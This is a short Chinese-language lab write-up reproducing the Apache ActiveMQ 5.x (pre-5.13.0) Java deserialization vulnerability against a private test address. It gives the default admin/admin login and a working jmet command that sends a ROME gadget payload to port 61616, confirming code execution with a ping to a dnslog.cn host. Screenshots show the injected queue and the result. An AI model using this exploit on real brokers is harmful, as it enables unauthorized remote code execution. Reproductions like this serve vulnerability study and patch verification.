Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring
Framework等。Apache ActiveMQ
5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

本文仅做漏洞复现记录与实现，利用流程如下:

## 一、漏洞环境信息

目标链接：http://192.168.101.152:8161/

![1615449896_6049cf28520fd03160ae4.png!small](https://image.3001.net/images/20210311/1615449896_6049cf28520fd03160ae4.png!small)

访问activemq 查看是否部署成功

[http://192.168.101.152:8161/admin/
默认账户密码(admin/admin)](http://192.168.101.152:8161/admin/%EF%BC%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81\(admin/admin\))

## 二、漏洞利用

执行命令

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "ping
test.z7wb3x.dnslog.cn" -Yp ROME 192.168.101.152 61616

![1615450226_6049d072c02784695aa01.png!small](https://image.3001.net/images/20210311/1615450226_6049d072c02784695aa01.png!small)

此时会给ActiveMQ添加一个事件队列，通过访问

[http://192.168.101.152:8161/admin/browse.jsp?JMSDestination=event](http://192.168.101.152:8161/admin/%EF%BC%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81\(admin/admin\))

可以查看到这个队列

![1615450339_6049d0e37034d9cf6e59e.png!small](https://image.3001.net/images/20210311/1615450339_6049d0e37034d9cf6e59e.png!small)

点击后执行命令

![1615450397_6049d11dc2138f23de5ce.png!small](https://image.3001.net/images/20210311/1615450397_6049d11dc2138f23de5ce.png!small)

![1615450428_6049d13cb90eb2b1d037a.png!small](https://image.3001.net/images/20210311/1615450428_6049d13cb90eb2b1d037a.png!small)

命令执行成功

